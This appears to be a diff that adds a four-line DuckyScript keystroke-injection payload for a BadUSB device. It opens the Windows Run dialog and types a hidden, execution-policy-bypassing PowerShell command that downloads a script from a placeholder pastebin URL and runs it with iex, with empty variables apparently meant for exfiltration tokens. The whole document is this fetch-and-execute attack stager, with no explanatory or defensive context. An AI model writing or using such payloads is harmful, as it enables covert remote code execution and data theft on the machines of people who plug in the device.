@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://pastebin.com/raw/YOURPASTEBIN | iex
+ENTER
